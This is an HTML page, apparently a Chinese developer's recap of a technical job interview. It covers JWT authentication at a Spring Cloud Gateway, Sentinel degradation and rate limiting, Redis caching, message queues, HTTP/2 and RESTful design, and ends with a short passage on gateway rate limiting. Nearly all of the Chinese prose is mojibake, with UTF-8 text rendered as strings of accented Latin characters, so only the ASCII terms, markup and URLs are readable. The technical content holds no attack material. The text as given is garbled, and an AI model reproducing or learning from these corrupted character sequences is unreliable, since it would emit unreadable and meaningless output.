<p>Qï¼šå¸Œæœ›èƒ½å¤Ÿç€é‡è®²ä¸€ä¸‹<a href="https://www.zhihu.com/question/452184164">é¡¹ç›®</a>ç»å†ä»¥åŠæ‰®æ¼”çš„è§’è‰²</p>
<p>Aï¼šå…·ä½“è®²äº†ä¸€ä¸‹è‡ªå·±åšçš„ä¸€ä¸ªå¾®æœåŠ¡<a href="https://www.zhihu.com/question/452184164">é¡¹ç›®</a>ï¼Œæœ‰xxxåŠŸèƒ½ï¼Œä»GateWayåˆ°Sentinelä»¥åŠRediså’ŒMQç­‰æŠ€æœ¯ï¼Œè®²äº†è®²å¦‚ä½•åœ¨ç½‘å…³å±‚é¢é€šè¿‡Tokené‰´æƒï¼ˆåŒæ—¶ç©¿æ’è‡ªå·±å¯¹æŠ€æœ¯é€‰å‹çš„è€ƒé‡ï¼‰</p>
<p>æˆ‘ä»¬æ•´ä¸ªé¡¹ç›®é‡‡ç”¨çš„æ˜¯å‰åç«¯åˆ†ç¦»å¼€å‘æ¨¡å¼ã€‚</p>
<ul>
<li><p>å‰ç«¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p>
<ul>
<li>åå°ç®¡ç†ï¼šä¸»è¦é¢å‘çš„æ˜¯æ•°æ®ç®¡ç†äººå‘˜ï¼Œé‡‡ç”¨åŸºäºVueçš„å•é¡µåº”ç”¨å¼€å‘æ–¹å¼</li>
<li>é—¨æˆ·ç³»ç»Ÿï¼šé¢å‘çš„æ˜¯å®¢æˆ·ï¼Œé—¨æˆ·é‡‡ç”¨çš„æ˜¯Vueç»“åˆNuxtå®ç°æœåŠ¡ç«¯æ¸²æŸ“æ–¹å¼</li>
</ul>
</li>
<li><p>åç«¯</p>
<p>åç«¯é‡‡ç”¨åŸºäºSpringCloudçš„å¾®æœåŠ¡æ¶æ„ï¼Œç»Ÿä¸€å¯¹å¤–æä¾›Resté£æ ¼æ¥å£ï¼Œæ— è®ºæ˜¯åå°ç®¡ç†è¿˜æ˜¯é—¨æˆ·ç³»ç»Ÿéƒ½å…±äº«è¿™äº›å¾®æœåŠ¡æ¥å£ï¼Œè€Œå¾®æœåŠ¡ä¸­é€šè¿‡JWTæ–¹å¼æ¥è¯†åˆ«ç”¨æˆ·èº«ä»½ï¼Œå¼€æ”¾ä¸åŒæ¥å£ã€‚</p>
<p>åˆ°è¿™é‡Œå…ˆä¸è¯´äº†ã€‚å¦‚æœç»§ç»­è¿½é—®å¾®æœåŠ¡æ‹†åˆ†ç²’åº¦æˆ–è€…SpringCloudç»†èŠ‚ï¼Œå†æ¥ç€å›ç­”æˆ‘ä»¬çš„æœåŠ¡æ‹†åˆ†ã€‚</p>
</li>
</ul>
<p>Qï¼šOKï¼Œé‚£æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæŠ€æœ¯ç‚¹èŠï¼Œé¦–å…ˆè®²è®²tokençš„æŠ€æœ¯åŸç†å§ï¼Ÿ</p>
<p>Aï¼šåœ¨<a href="https://www.zhihu.com/question/452184164">é¡¹ç›®</a>ä¸­ç”¨åˆ°çš„Tokenæ˜¯é€šè¿‡JJWTç”Ÿæˆçš„ï¼Œç„¶åè®²äº†è®²PayLoadä»¥åŠç›¸å…³å†…å®¹ï¼Œæœ€åè®²Tokené˜²ç¯¡æ”¹ç­‰å¥½å¤„</p>
<p>Qï¼šå¦‚æœTokenè¢«ç¬¬ä¸‰æ–¹æˆªè·äº†æ€ä¹ˆåŠï¼Ÿ</p>
<p>Aï¼šä½¿ç”¨HTTPSï¼Œä»¥ä¸‹çœç•¥å…«è‚¡æ–‡è‹¥å¹²</p>
<p>Qï¼šå‡è®¾ä¸€ä¸ªåœºæ™¯ï¼šç”¨æˆ·çš„Tokenè¢«ä»æŸjsæ’ä»¶ç›´æ¥æˆªè·å¹¶æ‹¿åˆ°åˆ«çš„æœºå™¨ä¸Šè®¿é—®ä½ çš„æ¥å£ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>Aï¼šï¼ˆå¯¹äºè¿™ä¸ªé—®é¢˜æœ‰ç‚¹æ‡µï¼Œå› ä¸ºä½ æµè§ˆå™¨é‡Œå­˜çš„å†…å®¹éƒ½èƒ½è¢«æ‹¿äº†é‚£ä¼¼ä¹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¥½çš„æ–¹æ³•å¤„ç†äº†ï¼Œä½†æ˜¯åæ¥æƒ³äº†æƒ³å¯ä»¥æŠŠç”¨æˆ·ipæˆ–è€…macåœ°å€æ”¾è¿›å»ï¼Œä½†æˆ‘æ„Ÿè§‰è¿˜æ˜¯æ²»æ ‡ä¸æ²»æœ¬ï¼Œå¸Œæœ›æœ‰å¤§ä½¬èƒ½å¸®æˆ‘è§£ç­”ä¸€ä¸‹ï¼‰æ€è€ƒäº†ä¸€ä¸‹ç„¶åè¯´æŠŠtokençš„æœ‰æ•ˆæ—¶é—´ç¼©çŸ­ï¼ˆç»™è‡ªå·±åŸ‹äº†å‘ï¼‰è¿™ä¸ªæ˜¯xssæ”»å‡»å§,åªéœ€è¦è®¾ç½®httponlyå°±å¯ä»¥é˜²å¾¡;</p>
<p>Qï¼šé‚£å¦‚æœç”¨æˆ·åœ¨å†™æ–‡ç« ï¼Œå†™äº†åŠä¸ªå°æ—¶ï¼Œä½ ç¼©å‡äº†tokençš„æœ‰æ•ˆæ—¶é—´ï¼Œç”¨æˆ·çš„ä½“éªŒä¼šå˜å·®å¾ˆå¤šï¼Œè¿™ç§æƒ…å†µæ€ä¹ˆåŠï¼Ÿ</p>
<p>Aï¼šè®²äº†è®²tokenè¿‡æœŸå¦‚ä½•å»¶æœŸï¼ˆæŠŠè‡ªå·±æ›´åŠ å¸¦è¿›å‘é‡Œäº†ï¼‰</p>
<p>Qï¼šé‚£ä½ åˆè¦ç¼©çŸ­tokenæœ‰æ•ˆæ—¶é—´ï¼Œåˆè¦å»¶æœŸè¿™ä¸æ˜¯å¾ˆçŸ›ç›¾å—ï¼Ÿå†µä¸”ä½ å»¶æœŸçš„è¯å¯¼è‡´æ¥å£çš„é£é™©ä¹Ÿä¼šé€æ¸å¢åŠ å‘¢ï¼ŸAï¼šæˆ‘çœŸä¸çŸ¥é“äº†å‘œå‘œå‘œï¼ï¼ˆå…¶å®æ„Ÿè§‰è¿™é‡Œè¯¥è®²è®²å¦‚ä½•åˆ¤æ–­ç”¨æˆ·æ´»è·ƒçš„ï¼Œç”¨æˆ·æ´»è·ƒå†è¿›è¡Œå»¶æœŸï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡é¢å¤§å‚çœŸçš„è¢«é—®æ‡µäº†ï¼‰</p>
<p>Qï¼šæ²¡å…³ç³»è¿™åªæ˜¯ä½œä¸ºå¼€æ”¾æ€§æ¢è®¨çš„é—®é¢˜è€Œå·²ï¼ˆè¢«å®‰æ…°ä¸€ä¸‹è¿˜æ˜¯æŒºå¥½çš„ï¼‰</p>
<p>Qï¼šä½ è¯´ä½ ç”¨GateWayå¯¹å¾®æœåŠ¡è¿›è¡Œè½¬å‘ï¼Œé‚£å¦‚æœæŸä¸ªæ¥å£çš„è®¿é—®ç‰¹åˆ«æ…¢ï¼Œä½ å¦‚ä½•é¿å…çš„ä½ ç½‘å…³è¢«è¿™ä¸ªç‰¹åˆ«æ…¢çš„å¾®æœåŠ¡æ‹–å®å‘¢ï¼Ÿ</p>
<p>Aï¼š(ä¸€å¼€å§‹æ²¡å¤ªå¬æ‡‚ï¼Œé¢è¯•å®˜åˆè¯¦ç»†æè¿°äº†ä¸€ä¸‹åœºæ™¯) å¦‚æœæ¥å£è®¿é—®ç‰¹åˆ«æ…¢ï¼Œæˆ‘ä»¬åœ¨é€‰å‹çš„æ—¶å€™ä½¿ç”¨äº†Sentinelï¼ŒSentinelå¯ä»¥å¯¹æ…¢æ¥å£è¿›è¡Œé™çº§ï¼Œç„¶åè®²äº†è®²Sentinelæ˜¯æ€ä¹ˆç”¨çš„</p>
<p>Qï¼šé™çº§ä¹Ÿæ˜¯ä¸€ç§ç­–ç•¥ï¼Œé‚£å¦‚æœè¿™ä¸ªé—®é¢˜äº§ç”Ÿçš„åŸå› æ˜¯ä½ çš„å¾®æœåŠ¡è‡ªèº«çš„é—®é¢˜ï¼Œä¸ç”¨Sentinelå¦‚ä½•å»è§£å†³ï¼Ÿï¼ˆæ’ä¸€å¥ï¼Œè¿™é‡Œåé¢å¤ç›˜çš„æ—¶å€™æ‰ååº”è¿‡æ¥é¢è¯•å®˜åº”è¯¥æ˜¯æƒ³é—®å¦‚ä½•æ’æŸ¥æ…¢æœåŠ¡ï¼Œæ¯”å¦‚ä»SQLã€ç½‘ç»œç­‰æ–¹é¢è¿›è¡Œè§£ç­”ï¼Œä½†æ˜¯tokené‚£ä¸ªé—®é¢˜çœŸæ˜¯æŠŠæˆ‘é—®æ‡µäº†ï¼Œåç»­çš„é—®é¢˜äººéƒ½æ˜¯å¤„äºä¸€ç§éº»æœ¨çš„çŠ¶æ€ï¼‰</p>
<p>Aï¼šè°ƒç”¨æ¥å£çš„æ—¶å€™å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œè®²äº†è®²FailBackä¹‹ç±»çš„ã€‚</p>
<p>Qï¼šå¦‚æœæˆ‘ä»¬æƒ³è¦æŸ¥æ˜è¿™ä¸ªæ…¢ï¼Œç©¶ç«Ÿæ˜¯å› ä¸ºç½‘ç»œæ¯”è¾ƒæ…¢ï¼Œè¿˜æ˜¯å› ä¸ºå¤æ‚ä¸šåŠ¡æ¯”è¾ƒæ…¢ï¼Œè¯¥å¦‚ä½•æ’æŸ¥ï¼Ÿç„¶åç»™äº†ä¸€ä¸ªè¯¦ç»†çš„ä¸èƒ½å†è¯¦ç»†çš„åœºæ™¯ï¼ˆå·²ç»æ˜ç¤ºäº†2333)</p>
<p>Aï¼šé¦–å…ˆæ’æŸ¥æ˜¯å¦ä¸ºç½‘ç»œåŸå› ï¼Œå…¶æ¬¡æ˜¯æ’æŸ¥æœåŠ¡ä¸­æ˜¯å¦æœ‰å¤æ‚æµç¨‹ï¼Œæœ€åæ£€æŸ¥æ˜¯å¦å› ä¸ºç¬¬ä¸‰æ–¹æ¡†æ¶çš„ä¸å®Œå–„ç­‰ç­‰å¯¼è‡´ç¼“æ…¢</p>
<p>Qï¼šé‚£æˆ‘ä»¬ç°åœ¨å¦‚æœå·²ç»ç¡®å®šäº†æ˜¯ç½‘ç»œæ¯”è¾ƒæ…¢ï¼Œæ€€ç–‘æ˜¯å‘ç”Ÿäº†ä¸¢åŒ…ï¼Œå¦‚ä½•å»ç¡®è®¤ï¼Ÿ</p>
<p>Aï¼špingå‘½ä»¤ï¼ˆtcpdump æˆ‘çœ‹è¿‡ä½†å¿˜è®°äº†ï¼ï¼ï¼</p>
<p>Qï¼šå»ºè®®å›å»äº†è§£ä¸€ä¸‹tcpdump</p>
<p>Qï¼šä½ è®¤ä¸ºæ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>Aï¼šè®²äº†è®²è‡ªå·±çš„ç†è§£ï¼ˆè§‰å¾—ä»–å’Œæ“ä½œç³»ç»Ÿé‡Œé¢çš„æ¶ˆæ¯é˜Ÿåˆ—å·®ä¸å¤šï¼‰ï¼Œç„¶åè¯´äº†è¯´ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹</p>
<p>Qï¼šå¦‚æœä¸€ä¸ªæ¶ˆæ¯æŠ•é€’äº†å¤šæ¬¡éƒ½æ²¡æˆåŠŸæ€ä¹ˆåŠï¼Ÿ</p>
<p>Aï¼šä¼šæŠŠæ¶ˆæ¯æŒä¹…åŒ–ï¼ˆå¿˜äº†ç­”æ­»ä¿¡é˜Ÿåˆ—ï¼Œè£‚å¼€ï¼‰</p>
<p>Qï¼šå¦‚ä½•æŒä¹…åŒ–ï¼Ÿ</p>
<p>Aï¼šç¡®å®æ²¡æ€ä¹ˆäº†è§£è¿‡</p>
<p>Qï¼šè¿™äº›åå‘åº•å±‚çš„ä¸œè¥¿æ²¡çœ‹è¿‡ç¡®å®ä¸å¤ªå¥½å›ç­”ï¼Œæ²¡å…³ç³»çš„ï¼Œæˆ‘ä»¬ä¸‹é¢æ¥èŠä¸€äº›åŸºç¡€çš„é—®é¢˜ï¼ˆå†…å¿ƒOSï¼šç»ˆäºåˆ°æˆ‘æœ€å–œæ¬¢çš„Javaå…«è‚¡æ–‡äº†å—ï¼Œå˜¿å˜¿å˜¿ï¼‰</p>
<p>Qï¼šæ“ä½œç³»ç»Ÿå­¦è¿‡å§ï¼Œä¸¾ä¸ªç®€å•æ —å­ï¼Œæˆ‘ä»¬ä»Šå¤©å†™äº†ä¸ªJavaåº”ç”¨ï¼Œæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œåœ¨æ–‡ä»¶å¥æŸ„ä¸­å†™å…¥äº†ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œflushè¿™ä¸ªæ–‡ä»¶å¥æŸ„æœ€åcloseæ‰ï¼Œä»æ“ä½œç³»ç»Ÿå±‚é¢è®²è®²è¿™æœŸé—´å‘ç”Ÿäº†å“ªäº›äº‹æƒ…ï¼Ÿ</p>
<p>Aï¼šèƒ¡æ‰¯äº†ä¸€äº›ç„¶åè¯´ä¸å¤ªäº†è§£ï¼ˆä¸ºä»€ä¹ˆåˆ«äººé—®æ“ä½œç³»ç»Ÿéƒ½æ˜¯çº¿ç¨‹è¿›ç¨‹æ­»é”ä¹‹ç±»çš„ï¼Œæˆ‘çš„è¿™ä¹ˆâ€œç®€å•â€å‘œå‘œå‘œ</p>
<p>Qï¼šé‚£ä½ è®²è®²è¿›ç¨‹é—´é€šä¿¡çš„æ–¹å¼å§ï¼Ÿ</p>
<p>Aï¼šå…«è‚¡æ–‡è‹¥å¹²</p>
<p>Qï¼šOKï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥é—®é—®æ•°æ®åº“æ–¹é¢çš„ï¼Œä¸€æ¡æ™®é€šçš„æŸ¥è¯¢è¯­å¥æ‰§è¡Œçš„æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>Aï¼šæˆ‘çœŸçš„æ˜¯è¢«é—®æ‡µäº†ï¼Œè¿™é‡Œåº”è¯¥ç­”è¿æ¥å™¨ï¼Œè§£æå™¨ä¼˜åŒ–å™¨ä¹‹ç±»çš„ï¼Œç»“æœæˆ‘è¯´åˆ°æ€ä¹ˆåœ¨B+æ ‘ä¸ŠæŸ¥æ‰¾å»äº†ï¼Œç”šè‡³è¿˜æ‰¯äº†MVCCï¼Œæˆ‘æ„Ÿè§‰é¢è¯•å®˜å¬ç€éƒ½å°´å°¬</p>
<p>Qï¼šè¿™ä¸ªåŸºç¡€éƒ¨åˆ†ä½ æŒæ¡çš„ä¸å¤Ÿæ‰å®å•Šï¼Œå¦‚æœä¸€æ¡SQLè¯­å¥æ‰§è¡Œçš„æ¯”è¾ƒæ…¢æ€ä¹ˆåŠï¼Ÿï¼ˆæˆ‘å¿ƒæƒ³æˆ‘å·²ç»å‡‰äº†ï¼ŒÎµ&#x3D;(Â´Î¿ï½€*)))å”‰</p>
<p>Aï¼šexplain ä»¥åŠç›¸åº”çš„åˆ†æ</p>
<p>Qï¼šHTTPäº†è§£è¿‡å§ï¼ŒHTTP2.0å’ŒHTTP1.1çš„åŒºåˆ«ï¼Ÿ</p>
<p>Aï¼š  HTTP2.0ä½¿ç”¨äº†å¤šè·¯å¤ç”¨çš„æŠ€æœ¯ï¼Œåšåˆ°åŒä¸€ä¸ªè¿æ¥å¹¶å‘å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè€Œä¸”å¹¶å‘è¯·æ±‚çš„æ•°é‡æ¯”HTTP1.1å¤§äº†å¥½å‡ ä¸ªæ•°é‡çº§ã€‚HTTP1.1ä¹Ÿå¯ä»¥å¤šå»ºç«‹å‡ ä¸ªTCPè¿æ¥ï¼Œæ¥æ”¯æŒå¤„ç†æ›´å¤šå¹¶å‘çš„è¯·æ±‚ï¼Œä½†æ˜¯åˆ›å»ºTCPè¿æ¥æœ¬èº«ä¹Ÿæ˜¯æœ‰å¼€é”€çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149721.jpeg" alt="img"></p>
<p>â€‹    HTTP1.1ä¸æ”¯æŒheaderæ•°æ®çš„å‹ç¼©ï¼ŒHTTP2.0ä½¿ç”¨HPACKç®—æ³•å¯¹headerçš„æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·æ•°æ®ä½“ç§¯å°äº†ï¼Œåœ¨ç½‘ç»œä¸Šä¼ è¾“å°±ä¼šæ›´å¿«ã€‚</p>
<p> ä¸ºäº†æ”¹å–„å»¶è¿Ÿï¼ŒHTTP2.0å¼•å…¥äº†server pushï¼Œå®ƒå…è®¸æœåŠ¡ç«¯æ¨é€èµ„æºç»™æµè§ˆå™¨ï¼Œåœ¨æµè§ˆå™¨æ˜ç¡®åœ°è¯·æ±‚ä¹‹å‰ï¼Œå…å¾—å®¢æˆ·ç«¯å†æ¬¡åˆ›å»ºè¿æ¥å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯è·å–ã€‚è¿™æ ·å®¢æˆ·ç«¯å¯ä»¥ç›´æ¥ä»æœ¬åœ°åŠ è½½è¿™äº›èµ„æºï¼Œä¸ç”¨å†é€šè¿‡ç½‘ç»œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149722.jpeg" alt="img"></p>
<p>Qï¼šä½ è¯´<a href="">é¡¹ç›®</a>ä¸­ç”¨äº†å‰åç«¯åˆ†ç¦»ä»¥åŠRESTfulï¼Œä»€ä¹ˆæ˜¯RESTfulï¼Ÿ</p>
<p>Aï¼šRESTful æ˜¯ç›®å‰æœ€æµè¡Œçš„ API è®¾è®¡è§„èŒƒï¼Œç”¨äº Web æ•°æ®æ¥å£çš„è®¾è®¡; RESTful çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„æ•°æ®æ“ä½œæŒ‡ä»¤éƒ½æ˜¯â€åŠ¨è¯ + å®¾è¯­â€çš„ç»“æ„ã€‚æ¯”å¦‚ï¼ŒGET &#x2F;articlesè¿™ä¸ªå‘½ä»¤ï¼ŒGETæ˜¯åŠ¨è¯ï¼Œ&#x2F;articlesæ˜¯å®¾è¯­ã€‚å®¾è¯­å¿…é¡»æ˜¯åè¯</p>
<p>æœ‰äº›å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨GETå’ŒPOSTè¿™ä¸¤ç§æ–¹æ³•ã€‚æœåŠ¡å™¨å¿…é¡»æ¥å—POSTæ¨¡æ‹Ÿå…¶ä»–ä¸‰ä¸ªæ–¹æ³•ï¼ˆPUTã€PATCHã€DELETEï¼‰ã€‚</p>
<p>è¿™æ—¶ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„ HTTP è¯·æ±‚ï¼Œè¦åŠ ä¸ŠX-HTTP-Method-Overrideå±æ€§ï¼Œå‘Šè¯‰æœåŠ¡å™¨åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªåŠ¨è¯ï¼Œè¦†ç›–POSTæ–¹æ³•ã€‚</p>
<p>ä¸ºäº†ç»Ÿä¸€èµ·è§ï¼Œå»ºè®®éƒ½ä½¿ç”¨å¤æ•° URLï¼Œæ¯”å¦‚GET &#x2F;articles&#x2F;2è¦å¥½äºGET &#x2F;article&#x2F;2ã€‚</p>
<p>å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œèµ„æºéœ€è¦å¤šçº§åˆ†ç±»ï¼Œå› æ­¤å¾ˆå®¹æ˜“å†™å‡ºå¤šçº§çš„ URLï¼Œæ¯”å¦‚è·å–æŸä¸ªä½œè€…çš„æŸä¸€ç±»æ–‡ç« ã€‚</p>
<p>æ›´å¥½çš„åšæ³•æ˜¯ï¼Œé™¤äº†ç¬¬ä¸€çº§ï¼Œå…¶ä»–çº§åˆ«éƒ½ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²è¡¨è¾¾ã€‚GET &#x2F;authors&#x2F;12?categories&#x3D;2</p>
<p>çŠ¶æ€ç å¿…é¡»ç²¾ç¡®; </p>
<p>Qï¼šè¯·æ±‚æ–¹å¼æœ‰å“ªäº›å‘€ï¼Ÿ</p>
<p>Aï¼šOptions,Delete, Post, Get, Put, Traceç­‰</p>
<p>Qï¼šä½¿ç”¨RESTfulå’Œç›´æ¥åŠ å‚æ•°æœ‰ä»€ä¹ˆåŒºåˆ«å—ï¼Ÿ</p>
<p>Aï¼šæˆ‘ä¸ªäººæ„Ÿè§‰æ˜¯æ²¡ä»€ä¹ˆåŒºåˆ«2333</p>
<p>Qï¼šä¸ºä»€ä¹ˆæ¶æ„ä¸­è¦ä½¿ç”¨GateWayï¼Ÿ</p>
<p>Aï¼šGateWayç”¨æ¥ç»™å„ä¸ªå¾®æœåŠ¡è¿›è¡Œåä»£ï¼Œç„¶åè¯¦ç»†è¯´äº†ä¸€ä¸‹æ€ä¹ˆåšçš„ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆåš</p>
<p>Qï¼šå¦‚æœè®©ä½ æ¥å®ç°ä¸€ä¸ªGateWayï¼Œä½ è§‰å¾—è¦åšå“ªäº›è€ƒé‡ï¼Ÿ</p>
<p>Aï¼šåŠ¨æ€é…ç½®è·¯ç”±ï¼Œè´Ÿè½½å‡è¡¡ï¼Œæ”¯æŒè‡ªå®šä¹‰æ‹¦æˆªç­‰ç­‰è¯¦ç»†è®²äº†å¾ˆå¤š</p>
<p>Qï¼šä½ è¯´ä½ åœ¨ç½‘å…³å±‚é¢åšäº†é‰´æƒï¼Œè¯¦ç»†è®²è®²ï¼Ÿ</p>
<p>Aï¼šåœ¨GateWayä¸Šå†™äº†ä¸€äº›è§„åˆ™ï¼Œæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚ï¼Œè§£ætokenï¼Œç„¶ååˆè®²äº†è®²tokenåŸç†ï¼Œå¦‚ä½•åŠ å¯†ï¼ˆ3DESï¼‰</p>
<p>Qï¼šä½ æœ‰äº†è§£è¿‡å„å¤§å‚å•†æä¾›çš„ç½‘å…³æœåŠ¡å—ï¼Ÿæ¯”å¦‚é˜¿é‡Œ<a href="">ç™¾åº¦</a><a href="">è…¾è®¯</a>æä¾›çš„ï¼Ÿ</p>
<p>Aï¼šæ²¡äº†è§£è¿‡</p>
<p>Qï¼šä½ åœ¨ç½‘å…³ä¸Šè¿˜åšäº†é™æµï¼Ÿ</p>
<p>Aï¼šSentinelç›¸å…³çš„å†…å®¹ï¼Œå°±æŠŠé™æµï¼Œé™çº§ï¼Œç†”æ–­çš„è§„åˆ™éƒ½è®²äº†è®²ï¼Œç„¶åæŠŠåœºæ™¯ä¹Ÿè®²äº†è®²</p>
<p>Qï¼šå¦‚æœè®©ä½ æ¥å®ç°ä¸€ä¸ªé™æµæ¡†æ¶ï¼Œæ€ä¹ˆåšï¼Ÿï¼ˆè¿™æ–¹é¢è¿˜å¥½æˆ‘ä¹‹å‰æ¯”è¾ƒå–œæ¬¢ï¼Œå»äº†è§£äº†æ¯”è¾ƒå¤šç›¸å…³çŸ¥è¯†ï¼‰</p>
<p>Aï¼šä»¤ç‰Œæ¡¶ï¼Œæ¼æ¡¶ï¼Œsemaphorç­‰ï¼Œç„¶ååˆ©ç”¨Guavaçš„RateLimiterè¯¦ç»†çš„è®²äº†ä¸€ä¸‹ä»¤ç‰Œæ¡¶ï¼Œåˆé€šè¿‡ä¸€ä¸ªä¾‹å­è®²äº†ä¸€ä¸‹Semaphor</p>
<p>Qï¼šé‚£æ¼æ¡¶å‘¢ï¼Ÿ</p>
<p>Aï¼šè¡¥å……äº†ä¸€ä¸‹æ¼æ¡¶æ¨¡å‹</p>
<p>Qï¼šä½ è§‰å¾—æ¼æ¡¶å’Œä»¤ç‰Œæ¡¶çš„åŒºåˆ«åœ¨å“ªï¼Ÿ</p>
<p>Aï¼šè®²äº†ä¸€ä¸‹è‡ªå·±å¯¹ä¸¤è€…çš„ç†è§£</p>
<p>Qï¼šRedisæˆ‘çœ‹ä½ ä¹Ÿæœ‰ç”¨åˆ°ï¼Œä¸ºä»€ä¹ˆRedisè¿™ä¹ˆå¿«ï¼Ÿ</p>
<p>Aï¼šå…«è‚¡</p>
<p>Qï¼šIOå¤šè·¯å¤ç”¨è¯¦ç»†è®²ä¸€ä¸‹</p>
<p>Aï¼šbalabalabala</p>
<p>Qï¼šnettyæœ‰äº†è§£å—ï¼Ÿ</p>
<p>Aï¼šäº†è§£çš„ä¸å¤š</p>
<p>Qï¼š<a href="">redis</a>çš„å¸¸ç”¨ç±»å‹ï¼Œzsetçš„åº•å±‚æ•°æ®ç»“æ„ï¼Ÿ</p>
<p>Aï¼šè·³è¡¨ï¼Œä¸ºä»€ä¹ˆç”¨è·³è¡¨</p>
<p>Qï¼šç¼“å­˜å‡»ç©¿ï¼Œç¼“å­˜é›ªå´©ï¼Œç¼“å­˜ç©¿é€æœ‰äº†è§£è¿‡å—ï¼Ÿ</p>
<p>Aï¼šå…«è‚¡ï¼Œé¡ºä¾¿è®²äº†è®²ç¼“å­˜æ·˜æ±°ç­–ç•¥ï¼Œå¸ƒéš†è¿‡æ»¤å™¨ç­‰</p>
<p>Qï¼šå¸ƒéš†è¿‡æ»¤å™¨åŸç†ï¼Ÿ</p>
<p>Aï¼šè®°ä¸å¤ªæ¸…äº†ï¼Œå¤§æ¦‚è®°å¾—å’Œhashmapå·®ä¸å¤šï¼Œç­”äº†ä¸€ä¸‹</p>
<p>Qï¼šå•Keyè¿‡çƒ­æ€ä¹ˆåŠï¼Ÿ</p>
<p>Aï¼šRedisé›†ç¾¤ï¼Œç„¶åä¸€è‡´æ€§hashï¼ŒæŠŠè®¿é—®æ‰“åˆ°ä¸åŒæœºå™¨ä¸Š</p>
<p>å¼€å§‹é—®å¦ä¸€ä¸ª<a href="">é¡¹ç›®</a></p>
<p>Qï¼šç»Ÿè®¡ç”¨æˆ·è®¿é—®ipæ€ä¹ˆåšçš„ï¼Ÿ</p>
<p>Aï¼šMySQLï¼Œç”¨AOPåœ¨ç”¨æˆ·è®¿é—®çš„æ—¶å€™è®°å½•</p>
<p>Qï¼šå®ç°äº†ç»Ÿè®¡pvï¼Œå¦‚ä½•å®ç°uvï¼Ÿ</p>
<p>Aï¼šåšå¥½å»é‡ï¼Œè®°å½•ç”¨æˆ·è®¿é—®ä¿¡æ¯çš„æ—¶å€™æŠŠæ—¶é—´æˆ³å¸¦ä¸Š</p>
<p>Qï¼šå¦‚ä½•å»é‡ï¼Ÿåœ¨MySQLé‡Œé¢åšå—ï¼Ÿ</p>
<p>Aï¼šæ˜¯çš„</p>
<p>Qï¼šæœ‰äº†è§£è¿‡hadoopç›¸å…³å—ï¼Ÿ</p>
<p>Aï¼šäº†è§£è¿‡ï¼Œä½†æ˜¯æ²¡åœ¨<a href="">é¡¹ç›®</a>ä¸­ä½¿ç”¨è¿‡</p>
<p>Qï¼šå»ºè®®å¯ä»¥å»äº†è§£ä¸€ä¸‹ï¼Œå› ä¸ºå¤§æ•°æ®ç›¸å…³æŠ€æœ¯åœ¨æˆ‘ä»¬è¿™é‡Œç”¨çš„æŒºå¤šçš„</p>
<p>Qï¼šå¦‚æœæœ‰å¤§é‡æ•°æ®çš„è¯è¿˜èƒ½ç›´æ¥åœ¨MySQLé‡Œé¢åšå»é‡å—ï¼Ÿ</p>
<p>Aï¼šå¤§é‡æ•°æ®å°±ç”¨Redisï¼Œä½¿ç”¨bitMapå¯ä»¥ä¸€æˆ˜</p>
<p>ï¼ˆå¯¹äºè¿™é‡Œåˆæäº†å‡ ä¸ªåœºæ™¯ï¼Œæœ€åç¡®å®ç­”ä¸å‡ºäº†ï¼Œæ„Ÿè§‰åªæœ‰åˆ†å¸ƒå¼è®¡ç®—æ‰èƒ½ç ´äº†ï¼‰</p>
<p>Qï¼šè®²è®²ä½ çš„å‡ ä¸ªå¥–é¡¹å§ï¼Ÿ</p>
<p>Aï¼šæŠŠå¥–é¡¹ï¼Œ<a href="">é¡¹ç›®</a>è®²äº†è®²balabala</p>
<h1 id="SpringCloud"><a href="#SpringCloud" class="headerlink" title="SpringCloud"></a>SpringCloud</h1><h2 id="Gatewayé™æµ-äº†è§£"><a href="#Gatewayé™æµ-äº†è§£" class="headerlink" title="Gatewayé™æµ(äº†è§£)"></a>Gatewayé™æµ(äº†è§£)</h2><p>ç½‘å…³é™¤äº†è¯·æ±‚è·¯ç”±ã€èº«ä»½éªŒè¯ï¼Œè¿˜æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„ä½œç”¨ï¼šè¯·æ±‚é™æµã€‚å½“ç³»ç»Ÿé¢å¯¹é«˜å¹¶å‘è¯·æ±‚æ—¶ï¼Œä¸ºäº†å‡å°‘å¯¹ä¸šåŠ¡å¤„ç†æœåŠ¡çš„å‹åŠ›ï¼Œéœ€è¦åœ¨ç½‘å…³ä¸­å¯¹è¯·æ±‚é™æµï¼ŒæŒ‰ç…§ä¸€å®šçš„é€Ÿç‡æ”¾è¡Œè¯·æ±‚ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149723.png" alt="image-20200108155348648"></p>
